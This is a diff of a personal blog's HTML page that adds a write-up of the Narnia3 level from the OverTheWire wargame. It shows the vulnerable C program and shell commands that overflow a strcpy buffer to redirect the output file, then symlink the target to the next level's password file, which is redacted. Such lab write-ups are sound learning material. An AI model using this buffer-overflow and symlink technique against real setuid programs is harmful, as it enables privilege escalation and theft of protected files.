@@ -1,18 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<meta name="generator" content="Hugo 0.155.2">
   
-    <title>exploit dev</title>
+    <title>Narnia3 :: exploit dev</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="" />
+<meta name="description" content="Onto narnia3.. Its listing is as follows:
+#include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv){ int ifd, ofd; char ofile[16] = &#34;/dev/null&#34;; char ifile[32]; char buf[32]; if(argc != 2){ printf(&#34;usage, %s file, will send contents of file 2 /dev/null\n&#34;,argv[0]); exit(-1); } /* open files */ strcpy(ifile, argv[1]); if((ofd = open(ofile,O_RDWR)) &lt; 0 ){ printf(&#34;error opening %s\n&#34;, ofile); exit(-1); } if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){ printf(&#34;error opening %s\n&#34;, ifile); exit(-1); } /* copy from file1 to file2 */ read(ifd, buf, sizeof(buf)-1); write(ofd,buf, sizeof(buf)-1); printf(&#34;copied contents of %s to a safer place... (%s)\n&#34;,ifile,ofile); /* close &#39;em */ close(ifd); close(ofd); exit(1); } The program takes in one argument, supposedly a file and copies it to /dev/null. I wish it didnt copy it to /dev/null. I observe that it is ifile which is copied into from argv[1] via a strcpy. Additionally, note the ofile declared just above ifile is set to /dev/null.
+" />
 <meta name="keywords" content="" />
 
   <meta name="robots" content="noodp" />
 
-<link rel="canonical" href="https://0x4ngk4n.github.io/" />
+<link rel="canonical" href="https://0x4ngk4n.github.io/posts/narnia3/" />
 
 
 
@@ -72,10 +73,12 @@
 
 
 <meta property="og:locale" content="en" />
-<meta property="og:type" content="website" />
-<meta property="og:title" content="exploit dev">
-<meta property="og:description" content="" />
-<meta property="og:url" content="https://0x4ngk4n.github.io/" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Narnia3">
+<meta property="og:description" content="Onto narnia3.. Its listing is as follows:
+#include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv){ int ifd, ofd; char ofile[16] = &#34;/dev/null&#34;; char ifile[32]; char buf[32]; if(argc != 2){ printf(&#34;usage, %s file, will send contents of file 2 /dev/null\n&#34;,argv[0]); exit(-1); } /* open files */ strcpy(ifile, argv[1]); if((ofd = open(ofile,O_RDWR)) &lt; 0 ){ printf(&#34;error opening %s\n&#34;, ofile); exit(-1); } if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){ printf(&#34;error opening %s\n&#34;, ifile); exit(-1); } /* copy from file1 to file2 */ read(ifd, buf, sizeof(buf)-1); write(ofd,buf, sizeof(buf)-1); printf(&#34;copied contents of %s to a safer place... (%s)\n&#34;,ifile,ofile); /* close &#39;em */ close(ifd); close(ofd); exit(1); } The program takes in one argument, supposedly a file and copies it to /dev/null. I wish it didnt copy it to /dev/null. I observe that it is ifile which is copied into from argv[1] via a strcpy. Additionally, note the ofile declared just above ifile is set to /dev/null.
+" />
+<meta property="og:url" content="https://0x4ngk4n.github.io/posts/narnia3/" />
 <meta property="og:site_name" content="exploit dev" />
 
   <meta property="og:image" content="https://0x4ngk4n.github.io/og-image.png">
@@ -84,10 +87,10 @@
 <meta property="og:image:height" content="627">
 
 
+  <meta property="article:published_time" content="2026-03-10 16:02:35 &#43;0000 UTC" />
 
 
 
-  <link href="/index.xml" rel="alternate" type="application/rss+xml" title="exploit dev" />
 
 
 
@@ -122,33 +125,20 @@
 
   <div class="content">
     
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://0x4ngk4n.github.io/posts/narnia3/">Narnia3</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-03-10</time><span class="post-author">0x4ngk4n</span></div>
+
   
-  <div class="posts">
-    
-    
-
-    
-    
-      
-    
-    
-
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="https://0x4ngk4n.github.io/posts/narnia3/">Narnia3</a>
-        </h2>
-
-        <div class="post-meta"><time class="post-date">2026-03-10</time><span class="post-author">0x4ngk4n</span></div>
-
-        
-
-        
+  
 
 
-        <div class="post-content">
-          
-            <p>Onto narnia3.. Its listing is as follows:</p>
+  
+
+  <div class="post-content"><div>
+        <p>Onto narnia3.. Its listing is as follows:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
@@ -192,166 +182,64 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The program takes in one argument, supposedly a file and copies it to <code>/dev/null</code>. I wish it didnt copy it to <code>/dev/null</code>. I observe that it is <code>ifile</code> which is copied into from argv[1] via a <code>strcpy</code>. Additionally, note the <code>ofile</code> declared just above <code>ifile</code> is set to <code>/dev/null</code>.</p>
-          
-        </div>
+<p>Let&rsquo;s check normal execution of the binary first.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia3@narnia:~$ /narnia/narnia3 /etc/narnia_pass/narnia4
+</span></span><span style="display:flex;"><span>copied contents of /etc/narnia_pass/narnia4 to a safer place... <span style="color:#f92672">(</span>/dev/null<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The binary checks if the source file exists (if not throws error) and then checks if the destination file exists (throws error if not) and then copies the contents from source and writes to destination.</p>
+<p>From the source code, it would seem that the variable <code>ifile</code> can be overflowed and the way it overflows is that it bleeds into <code>ofile</code>. That means we can actually control the destination instead of <code>/dev/null</code> (as in variables resident in memory are stack adjacent). This is tested by the following experimentation.</p>
+<p>First we prepare the source and destination files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia3@narnia:~$ rm /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ mkdir -p /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/ &lt;- the last <span style="color:#e6db74">`</span>/tmp/<span style="color:#e6db74">`</span> exceeds the <span style="color:#ae81ff">32</span> byte buffer length and is overflowed.
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ touch /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb &lt;- create an overflowed size <span style="color:#e6db74">`</span>ifile<span style="color:#e6db74">`</span> which exists. Here the part <span style="color:#e6db74">`</span>/tmp/bbb<span style="color:#e6db74">`</span> is overflowed to <span style="color:#e6db74">`</span>ofile<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ echo <span style="color:#e6db74">&#34;aaa&#34;</span> &gt; /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ cat /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
+</span></span><span style="display:flex;"><span>aaa
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ touch /tmp/bbb &lt;- the overflowed and overwritten <span style="color:#e6db74">`</span>ofile<span style="color:#e6db74">`</span> entry 
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ cat /tmp/bbb
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ &lt;- notice the file <span style="color:#e6db74">`</span>/tmp/bbb<span style="color:#e6db74">`</span> is empty
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia3@narnia:~$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
+</span></span><span style="display:flex;"><span>copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb to a safer place... <span style="color:#f92672">(</span>/tmp/bbb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ cat /tmp/bbb
+</span></span><span style="display:flex;"><span>aaa &lt;- see how this file is now filled with <span style="color:#e6db74">&#34;aaa&#34;</span>
+</span></span></code></pre></div><p>Now we know we can control the destination but the need is to copy from a relevant source which is the next level password. And with character length control of a filename we can only create resources in the <code>/tmp</code> directory. Given this constraint and the set uid bit on the binary with the next level <code>narnia4</code> perms, we can have a symlinked file <code>/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb</code> which points to <code>/etc/narnia_pass/narnia4</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia3@narnia:~$ rm /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb &lt;- deleting previously created regular file
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ ln -s /etc/narnia_pass/narnia4 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ ls -al /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> narnia3 narnia3 <span style="color:#ae81ff">24</span> Mar <span style="color:#ae81ff">10</span> 19:59 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb -&gt; /etc/narnia_pass/narnia4
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
+</span></span><span style="display:flex;"><span>copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb to a safer place... <span style="color:#f92672">(</span>/tmp/bbb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>narnia3@narnia:~$ cat /tmp/bbb
+</span></span><span style="display:flex;"><span>&lt;redacted pass&gt;
+</span></span></code></pre></div><p>Done.</p>
 
-        
-          <div>
-            <a class="read-more button inline" href="/posts/narnia3/">[]</a>
-          </div>
-        
-      </article>
+      </div></div>
+
+  
     
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="https://0x4ngk4n.github.io/posts/narnia2/">Narnia2</a>
-        </h2>
-
-        <div class="post-meta"><time class="post-date">2026-03-10</time><span class="post-author">0x4ngk4n</span></div>
-
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p>Now its <code>narnia2</code>. It&rsquo;s been a while but yeah now continuing the series&hellip; Looking at the source code of /narnia/narnia3, it seems to be the case of a clear-cut stack-based buffer overflow. In this case, there is the vulnerable <code>strcpy</code> function which takes in user-controlled unsanitised buffer as the first argument.</p>
-<p>This is the corresponding code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (argc<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage: %s argument</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">strcpy</span>(buf, argv[<span style="color:#ae81ff">1</span>]); <span style="color:#75715e">// the buffer overflow
-</span></span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, buf);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Loading the file in <code>gdb</code> I have the following output when I try to overflow and control the EIP:</p>
-          
-        </div>
-
-        
-          <div>
-            <a class="read-more button inline" href="/posts/narnia2/">[]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="https://0x4ngk4n.github.io/posts/narnia0/">narnia0</a>
-        </h2>
-
-        <div class="post-meta"><time class="post-date">2026-02-10</time></div>
-
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p>Back in 2016, I started with bandit and it left it at that…</p>
-<p>Now, a decade after I pick up <strong>narnia</strong>.</p>
-<p>Login is standard as in any OTW wargame with an SSH.</p>
-<pre tabindex="0"><code>ssh narnia0@narnia.labs.overthewire.org -p2226
-</code></pre><p>In case of narnia, all target C code (for white-box analysis) and the corresponding binaries are at <code>/narnia</code> location.
-Passphrases to the next levels are at <code>/etc/narnia_pass/narnia/</code>.</p>
-<p>Now, that we are in, lets inspect the C code for <code>narnia0</code>.</p>
-          
-        </div>
-
-        
-          <div>
-            <a class="read-more button inline" href="/posts/narnia0/">[]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="https://0x4ngk4n.github.io/posts/narnia1/">narnia1</a>
-        </h2>
-
-        <div class="post-meta"><time class="post-date">2026-02-10</time></div>
-
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p>lets login to narnia1 and see what’s the source code.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">int main(){</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;EGG&#34;</span>)<span style="color:#f92672">==</span>NULL){
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Give me something to execute at the env-variable EGG</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Trying to execute EGG!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;EGG&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>I’ve always had difficulty reading C syntax, especially this line: <code>int (ret*)();</code></p>
-<p>The way I read it is <code>ret is a pointer to a function returning an int</code>.</p>
-<p>Next, ret is being assigned this value from an environment variable <code>EGG</code> and then executed <code>ret()</code>.</p>
-          
-        </div>
-
-        
-          <div>
-            <a class="read-more button inline" href="/posts/narnia1/">[]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="https://0x4ngk4n.github.io/posts/first/">here it goes&hellip;</a>
-        </h2>
-
-        <div class="post-meta"><time class="post-date">2026-02-09</time></div>
-
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p><del>A little</del> About me…</p>
-<p>I am Angkan and as of today, I have been in IT for about 14 years now.</p>
-<p>Back when I started, I was doing tech support for firewalls which, while I didn’t enjoy much but got me hooked into how computers communicate. Fast forward few job hoops where I acquired skills such as scripting and nix fundamentals, I landed a role where I gained exposure to first hand cyber-attacks employed by attackers-in-the-wild. This was 10 years back from today. Attacks were mostly around lack of input validation, source to sink based, deterministic in nature and like many before me and after, I was also like <strong>wow ^~^</strong> would be cool to be a hacker-at-work.</p>
-          
-        </div>
-
-        
-          <div>
-            <a class="read-more button inline" href="/posts/first/">[]</a>
-          </div>
-        
-      </article>
-    
-
-    <div class="pagination">
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h"></span>
+    <hr />
+  </div>
   <div class="pagination__buttons">
     
     
     
+      <a href="https://0x4ngk4n.github.io/posts/narnia2/" class="button inline next">
+         [<span class="button__text">Narnia2</span>] &gt;
+      </a>
+    
   </div>
 </div>
 
-  </div>
+
+  
+
+  
+    
+
+  
+</article>
 
   </div>
 
